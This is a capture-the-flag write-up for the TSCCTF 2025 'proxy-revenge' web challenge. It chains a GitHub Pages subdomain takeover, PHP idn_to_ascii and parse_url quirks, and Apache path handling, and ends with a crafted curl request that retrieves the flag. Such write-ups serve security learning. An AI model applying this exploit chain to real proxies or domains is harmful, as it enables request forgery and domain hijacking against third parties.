1. `*.tscctf-2025.ctftime.uk` points to `ching367436.github.io. Therefore, it is possible to perform a subdomain takeover using GitHub Pages.
```
❯ dig test.tscctf-2025.ctftime.uk     
# ...
ching367436.tscctf-2025.ctftime.uk. 300    IN CNAME ching367436.github.io.
# ...
```

2. PHP `idn_to_ascii` will return false when encountering an error.
```php
// https://github.com/php/php-src/blob/php-8.2.25/ext/intl/idn/idn.c#L78
len = uidna_nameToASCII_UTF8(uts46, ZSTR_VAL(domain), ZSTR_LEN(domain),
    ZSTR_VAL(buffer), buffer_capac, &info, &status);
// [...] https://github.com/php/php-src/blob/php-8.2.25/ext/intl/idn/idn.c#L100-L104
if (info.errors == 0) {
  RETVAL_STR_COPY(buffer);
} else {
  RETVAL_FALSE;
}
```

3. Apache will serve `/index.php` even for the path like `/index.php/whatever`.

4. `index.php` will be parsed as host when prepending one additional `/` to `/index.php`.
```php
php > var_dump(parse_url('/index.php/test.tscctf-2025.ctftime.uk/?service=%e4'));
array(2) {
  ["path"]=>
  string(39) "/index.php/test.tscctf-2025.ctftime.uk/"
  ["query"]=>
  string(11) "service=%e4"
}
php > var_dump(parse_url('//index.php/test.tscctf-2025.ctftime.uk/?service=%e4'));
array(3) {
  ["host"]=>
  string(9) "index.php"
  ["path"]=>
  string(29) "/test.tscctf-2025.ctftime.uk/"
  ["query"]=>
  string(11) "service=%e4"
}
```

5. Combine the above to get the flag.

```sh
curl 'http://proxy-revenge-domain//index.php/4347835712Jjdiiefd.tscctf-2025.ctftime.uk/?service=%e4'
```

6. Write-up by other people:
- https://blog.maple3142.net/2025/01/16/tscctf-2025-writeups/#proxy-revenge